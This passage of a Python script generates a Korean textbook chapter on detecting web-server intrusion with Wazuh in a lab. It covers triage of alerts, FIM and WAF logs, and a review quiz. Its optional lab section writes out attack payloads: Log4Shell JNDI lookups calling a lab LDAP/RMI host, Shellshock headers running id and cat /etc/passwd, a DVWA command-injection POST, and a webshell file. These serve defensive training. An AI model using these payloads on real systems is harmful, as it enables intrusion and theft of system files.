    box('field','판정 표의 “미확인”은 조사할 일이 남았다는 표시이다. 보고서에는 “Shellshock 형태 요청에 200 응답(31168). CGI·Bash 실행 근거는 아직 없음. web의 cmdlog·FIM에서 같은 시각 변화 없음 확인.”처럼 확인한 범위와 확인한 기록을 함께 쓴다.'),
    h('4. 집계로 보기(선택)'),
    p('Dev Tools에서 6.6의 D06-01을 다음처럼 바꾸면 그룹별·응답 코드별 건수를 한 번에 본다. term의 agent.name은 그대로 두고 range를 실습 시간으로 바꾼 뒤, by_src의 terms 필드를 rule.groups로, 안쪽 by_rule의 필드를 data.id로 바꾼다. attack 그룹 안에서 2xx가 몇 건인지가 우선 조사 대상의 수이다.'))

# ── 7.9 ──────────────────────────────────────────────────────
section('7.9  원본과 정의 확인',
    c('docker exec -it kt66-web /bin/bash',
      'kt66-web 컨테이너의 셸로 들어간다.',
      'C07-01과 같다.',
      '프롬프트가 kt66-web 안으로 바뀐다.',HOST),
    c("grep -n -e ServerName -e DocumentRoot \\\n  -e 'ProxyPass ' -e SecRuleEngine \\\n  /etc/apache2/sites-enabled/*.conf",
      '사이트 이름별 문서 루트·전달 대상·WAF 모드를 읽는다.',
      '-e는 찾을 문자열을 하나씩 지정한다. 여러 번 쓰면 그중 하나라도 들어간 줄을 출력한다. \'ProxyPass \'의 뒤 공백은 ProxyPassReverse 줄을 빼기 위한 것이고, 작은따옴표가 공백까지 한 인자로 묶는다. *.conf는 셸이 파일 목록으로 펼친다.',
      'landing의 DocumentRoot /var/www/landing, juice의 ProxyPass http://juiceshop:3000/과 SecRuleEngine DetectionOnly, dvwa의 ProxyPass http://dvwa:80/이 나온다.',WEB),
    c("grep -n -F 'book07-shell.php' \\\n  /var/log/apache2/landing_access.log\ntail -n 5 /var/log/apache2/modsec_audit.log",
      '웹셸 요청의 원문과 최근 WAF 감사 기록을 읽는다.',
      'IP 주소로 보낸 요청은 기본 사이트 landing의 로그에 남는다. tail -n 5는 파일 끝 다섯 줄을 출력한다. 감사 기록은 한 줄이 긴 JSON이다.',
      '웹셸 요청의 시각·출발지·404와, 최근 요청의 탐지 메시지를 읽는다.',WEB),
    c('exit',
      'kt66-web 셸에서 나온다.',
      'exit는 현재 셸을 끝낸다.',
      'kt66 VM의 프롬프트로 돌아온다.',WEB),
    c('docker exec -it kt66-dvwa /bin/bash',
      'DVWA 컨테이너의 셸로 들어간다.',
      '6.8과 같은 명령이다.',
      '프롬프트가 kt66-dvwa 안으로 바뀐다.',HOST),
    c('cat /var/www/html/vulnerabilities/exec/source/low.php\nexit',
      '명령 삽입 처리 코드를 읽고 나온다.',
      'cat으로 PHP 코드를 출력한다.',
      'POST의 Submit 조건, $_REQUEST의 ip, ping -c 4와 입력을 이어 붙여 shell_exec로 실행하는 줄이 나온다. 7.5의 GET이 명령을 만들지 않는 이유를 확인한다.',DVWA),
    c('docker exec -it kt66-siem /bin/bash',
      'Manager 컨테이너의 셸로 들어간다.',
      '4.5와 같은 명령이다.',
      '프롬프트가 kt66-siem 안으로 바뀐다.',HOST),
    c("grep -n -A 6 -F 'id=\"31168\"' \\\n  /var/ossec/ruleset/rules/0245-web_rules.xml\nexit",
      'Shellshock 탐지 규칙 31168의 조건을 읽고 나온다.',
      '-A 6은 일치한 줄 뒤 여섯 줄을 함께 출력한다. 작은따옴표는 큰따옴표를 포함한 검색어를 그대로 넘긴다. 31168을 31106·31108·31166·31162로 바꿔 같은 방법으로 읽는다.',
      'if_sid 31108과 Shellshock 구문의 regex, level="15"가 나온다. 31108은 응답 코드 2·3으로 시작하는 단순 요청 분류이다.',SIEM))

# ── 7.10 ─────────────────────────────────────────────────────
section('7.10  결과가 다를 때와 원상복구',
    tab(['증상','확인 순서'],[
        ['juice.kt66.lab이 열리지 않는다','hosts 줄 → kt66 기동 → Juice Shop 컨테이너 상태'],
        ['FIM 554가 없다','파일 존재 → /var/www 감시 설정(C07-02) → web 연결 → 기간'],
        ['웹셸 URL이 404','요청한 사이트 이름과 문서 루트(C07-09)'],
        ['200인데 경보가 없다','URL 원문 → 규칙 조건 → 아카이브'],
        ['POST 본문을 찾을 수 없다','Network의 Payload → WAF 감사 기록의 저장 범위'],
        ['500이 경보 수와 다르다','같은 기간 → 같은 기록 종류 → rule.id별로 나눠 세기']],[42,85],keep=True),
    h('원상복구'),
    ol('7.2의 실습 파일 삭제(C07-06)와 553 기록을 확인한다.',
       'Network conditions의 **Use browser default**를 켠다.',
       '**DVWA Security**를 원래 값으로 되돌리고 **Logout**을 누른다.',
       'hosts에 추가한 juice 이름은 이후 장에서 쓰지 않으면 지운다.',
       'Discover의 필터·검색식을 비우고 wazuh-alerts-*, Last 24 hours로 되돌린다.'),
    {'type':'image','path':'assets/illustrations/diversity/v1-c07-response.png','caption':'삽화. 요청과 처리 결과의 증거 대조.','width_mm':45,'align':'right'},
    p('조사 기록 양식은 examples/rev01/chapter07/investigation.txt이다. 7.8의 판정 표를 사건 노트에 옮긴다.'))

# ── 7.11 ─────────────────────────────────────────────────────
section('7.11  선택 실습: curl로 요청 보내기',
    p('브라우저로 보내기 어려운 Referer·X-Api-Version 헤더나 반복 요청은 공격자 VM의 curl로 보낸다. -A는 User-Agent, -H 이름:값은 임의 헤더를 지정한다. 작은따옴표는 $·중괄호·세미콜론을 셸이 해석하지 않고 그대로 넘긴다. 공격자 VM의 /etc/hosts에도 juice 이름을 추가한다(5.12). [8]'),
    c("curl -i --max-time 15 --get \\\n  -A '${jndi:ldap://192.168.0.202:1389/a}' \\\n  --data-urlencode \\\n  'q=${jndi:ldap://192.168.0.202:1389/a}' \\\n  http://dvwa.kt66.lab/",
      'User-Agent와 URL 쿼리에 같은 JNDI 문자열을 넣어 보낸다.',
      '--get과 --data-urlencode는 q 값을 인코딩해 URL에 붙인다(5.12).',
      '응답 코드와 본문을 읽고 Q07-03으로 찾는다. 이 명령은 LDAP 서버를 만들지 않는다.',ATT),
    c("J='${${lower:j}ndi:ldap://192.168.0.202:1389/b}'\ncurl -i --max-time 15 \\\n  -H \"X-Api-Version: $J\" \\\n  -A '${jndi:rmi://192.168.0.202:1099/c}' \\\n  http://dvwa.kt66.lab/",
      '쪼갠 JNDI를 X-Api-Version 헤더에, RMI 조회를 User-Agent에 넣는다.',
      '첫 줄은 긴 값을 셸 변수 J에 저장한다. 작은따옴표 안이라 ${…}가 그대로 저장된다. -H의 큰따옴표 안에서 $J는 저장한 값으로 바뀌고, 바뀐 값 속의 ${…}는 다시 해석되지 않는다. 콜론 앞이 헤더 이름, 뒤가 값이다.',
      '강의 자료의 같은 요청은 302였다. Q07-04로 찾고, X-Api-Version 값이 접속 로그에 없는 것을 확인한다.',ATT),
    c("curl -i --max-time 15 \\\n  -A '() { :; }; /bin/bash -c \"id\"' \\\n  http://juice.kt66.lab/cgi-bin/test.cgi",
      'User-Agent에 Shellshock 구문을 넣는다.',
      '큰따옴표는 바깥 작은따옴표 안에 있으므로 헤더 값에 그대로 들어간다.',
      '강의 자료에서는 200이었다. 본문이 Juice Shop 첫 화면인지 명령 출력인지 읽는다.',ATT),
    c("R='() { :; }; /bin/bash -c \"cat /etc/passwd\"'\ncurl -i --max-time 15 -H \"Referer: $R\" \\\n  http://dvwa.kt66.lab/cgi-bin/status",
      'Referer 헤더에 Shellshock 구문을 넣는다.',
      'Referer는 이전 페이지 주소를 알리는 헤더이다. C07-17처럼 값을 변수 R에 저장해 -H로 넘긴다.',
      '강의 자료에서는 403과 31166이었다.',ATT),
    c("curl -i --max-time 15 \\\n  --data 'ip=127.0.0.1;id&Submit=Submit' \\\n  http://dvwa.kt66.lab/vulnerabilities/exec/",
      '명령 삽입 입력을 POST 본문으로 보낸다.',
      '--data는 값을 요청 본문에 넣고 POST를 선택한다. 앰퍼샌드(&)는 두 필드를 나누며, 작은따옴표 안이라 셸의 백그라운드 기호로 해석되지 않는다.',
      '로그인 쿠키가 없어 302와 Location: login.php가 나온다. 로그인한 브라우저 POST의 결과와 구분한다.',ATT),
    c('for i in $(seq 1 20); do\n  curl -sS --max-time 15 -o /dev/null \\\n    -w "%{http_code} " \\\n    "http://juice.kt66.lab/rest/products/search?q=%27$i"\ndone\nprintf "\\n"',
      '7.7의 반복 요청을 한 번에 보낸다.',
      'seq 1 20은 1부터 20까지 출력하고, $(…)는 그 출력을 반복 목록으로 쓴다. for는 각 숫자를 i에 넣어 do~done을 반복한다. -o /dev/null은 본문을 버리고, -w "%{http_code} "는 응답 코드만 출력한다. 마지막 printf는 줄을 바꾼다.',
      '응답 코드 20개가 한 줄에 나온다. 강의 자료에서는 모두 500이었다. 000은 응답을 받지 못한 요청이다. 7.7을 브라우저로 마쳤다면 실행하지 않는다.',ATT),
    p('보낸 요청을 공격 일지에 적는다. -A·-H 값은 그 명령에만 적용된다. 셸 변수는 unset J R로 지운다.'))

# ── 장 끝 ─────────────────────────────────────────────────────
page('7장 정리',
    h('핵심 정리'),
    ul('실행 판정은 입력 흔적 → 처리 흔적 → 서버 변화 → 실행 결과의 네 단계로 한다. 웹 공격 경보는 대부분 1·2단계의 기록이다.',
       'Shellshock 31168(수준 15)과 31106의 “detected·success”는 응답 코드 2xx·3xx 조건에서 나온다. 실행 근거는 3·4단계 기록에서 찾는다.',
       'kt66-web의 3단계 기록은 FIM(554·550·553), cmdlog(100260), ClamAV(52502)이다. rule.groups로 나누어 2xx 공격 요청의 시간대로 피벗한다.',
       '접속 로그에는 POST 본문과 User-Agent·Referer 외의 헤더가 없다. 그 입력은 WAF 감사 기록과 브라우저 Network에서 확인한다.'),
    h('확인 문제'),
    ol('웹 경로에 shell.php가 추가되었다(554). 웹셸이 실행되었다고 쓰려면 무엇을 더 확인하는가?',
       '31168(Shellshock attack detected)이 있다. 이 경보의 조건으로 확인되는 것은 어디까지인가?',
       '명령 삽입을 POST로 보냈는데 URL 검색으로 찾을 수 없다. 이유와 대안은?',
       '500 응답 20개를 보냈는데 31162가 없다. 가능한 이유는?',
       '웹 공격 경보는 수십 건인데 rule.groups: ("syscheck" OR "virus" OR "cmdlog")는 0건이다. 어떻게 판정하는가?'),
    h('확인 문제 해설'),
    ol('그 파일을 요청한 URL과 응답(본문의 명령 출력), 같은 시각의 명령 기록·프로세스를 확인한다. 404이면 URL이 파일에 닿지 않은 것이다.',
       '헤더에 Shellshock 구문이 있었고 응답이 2xx·3xx였다는 2단계까지이다. CGI·Bash 호출과 명령 실행은 별도 기록이 필요하다.',
       '접속 로그는 POST 본문을 기록하지 않는다. WAF 감사 기록의 저장 범위와 브라우저 Network의 Payload를 확인한다.',
       '공격 문자열이 든 500은 31103 등 공격 규칙이 먼저 붙어 31122가 아니다. 31162는 31122가 같은 출발지에서 반복될 때만 붙는다.',
       '서버 변화(3단계)의 근거가 없으므로 현재 판정은 2단계까지이다. 수집 범위(감시 경로·cmdlog 대상 셸)에 빈틈이 없는지 함께 적는다.'),
    h('더 읽을거리'),
    p('Wazuh FIM 문서이다. realtime, report_changes, whodata 옵션이 각각 무엇을 더 기록하는지 7.1의 표와 대조한다.'),
    link('Wazuh · File integrity monitoring','https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html'),
    p('OWASP의 파일 업로드 방어 문서이다. 7.2의 웹셸이 놓이지 않게 하는 저장 위치·확장자·실행 권한 설정을 읽는다.'),
    link('OWASP · File Upload Cheat Sheet','https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html'))

section('7장 참고 자료',
    p('실습 절차와 결과 화면의 출처는 Module 01 Wazuh 위협탐지 DQL 강의 자료의 실습 07~12(2026년 10월 31일 기록)이다. kt66 설정은 기준 커밋 63d4180, 규칙은 Wazuh 4.10.0과 대조했다.'),
    h('[1] kt66 web 수집 설정과 라우팅'),
    link('kt66 · web/wazuh-agent.conf.append','https://github.com/mrgrit/kt66/blob/'+COMMIT+'/web/wazuh-agent.conf.append'),
    link('kt66 · web/entrypoint.sh','https://github.com/mrgrit/kt66/blob/'+COMMIT+'/web/entrypoint.sh'),
    h('[2] Apache 로그'),
    link('Apache HTTP Server 2.4 · Log Files','https://httpd.apache.org/docs/2.4/logs.html'),
    h('[3] Wazuh FIM과 이벤트 기록'),
    link('Wazuh · File integrity monitoring','https://documentation.wazuh.com/current/user-manual/capabilities/file-integrity/index.html'),
    link('Wazuh 4.10 · Event logging','https://documentation.wazuh.com/4.10/user-manual/manager/event-logging.html'),
    h('[4] Log4Shell'),
    link('Apache Logging Services · Security','https://logging.apache.org/security.html'),
    h('[5] Shellshock'),
    link('Red Hat · Bash Code Injection Vulnerability','https://access.redhat.com/articles/1200223'),
    h('[6] Wazuh 웹 규칙'),
    link('Wazuh 4.10.0 · 0245-web_rules.xml','https://github.com/wazuh/wazuh/blob/v4.10.0/ruleset/rules/0245-web_rules.xml'),
    h('[7] OS 명령 삽입 방어'),
    link('OWASP · OS Command Injection Defense Cheat Sheet','https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html'),
    h('[8] 강의 자료'),
    link('Module 01 Wazuh 위협탐지 DQL · 슬라이드 116~174','https://docs.google.com/presentation/d/1o0H_2DDHBp8p2HvlSnEPbx6-jdURYzew/edit'))

INVESTIGATION='''웹 서버 실행 판정 기록 (사례 한 건마다)

사례 · 시각(KST) · 출발지:
1 입력 흔적(URL·헤더·감사 기록, rule.id):
2 처리 흔적(응답 코드·본문, 31106·31168 등):
3 서버 변화(FIM syscheck.path · cmdlog · ClamAV):
4 실행 결과(명령 출력 · 외부 통신 · 반환 자료):
판정(도달 단계)과 근거:
남은 확인 사항:
대응(보존 · 차단 · 수정):
원상복구(실습 파일 · User-Agent · DVWA 단계 · hosts):
'''
README='''7장 REV01 복사용 입력

C07-01~ : 명령 블록 번호와 같은 파일. 실행 위치는 manifest.json의 where를 따른다.
Q07-01~ : Discover 검색식. queries.json에 인덱스 패턴과 설명이 있다.
B07-01~12 : 브라우저 주소창·User-Agent·입력란 값과 hosts 줄. 도메인 kt66.lab은 자신의 값으로 바꾼다.
P07-webshell.php : 7.2에서 vim으로 입력하는 실습 코드
investigation.txt : 실행 판정 기록 양식

결과 화면과 결과 값은 강의 자료(2026-10-31)의 기록이다.
'''

if __name__=='__main__':
    data={'title':'웹 서버 침투와 실행 흔적','series':'해킹·침해대응 실무 with Wazuh · 시스템 침투와 SIEM 분석','baseline':COMMIT,'revision':'REV01',
          'comments':'REV01 원고. 결과 화면은 강의 슬라이드(2026-10-31) 기록. 새 공격 실행·UI 촬영·DQL 실서버 검증 없음.','pages':pages}
    OUT.mkdir(parents=True,exist_ok=True)
    (OUT/'volume01-chapter07.json').write_text(json.dumps(data,ensure_ascii=False,indent=2)+'\n')
    EX.mkdir(parents=True,exist_ok=True)
    for old in list(EX.glob('C07-*.txt'))+list(EX.glob('Q07-*.txt'))+list(EX.glob('B07-*.txt')):old.unlink()
    for b in commands+queries:(EX/(b['id']+'.txt')).write_text(b['text']+'\n')
    (EX/'manifest.json').write_text(json.dumps(commands,ensure_ascii=False,indent=2)+'\n')
    (EX/'queries.json').write_text(json.dumps(queries,ensure_ascii=False,indent=2)+'\n')
    for name,val in B07.items():(EX/name).write_text(val+'\n')
    (EX/'P07-webshell.php').write_text(PHP+'\n')
    (EX/'investigation.txt').write_text(INVESTIGATION)
    (EX/'README.txt').write_text(README)
    print(len(pages),'pages',len(commands),'commands',len(queries),'queries')
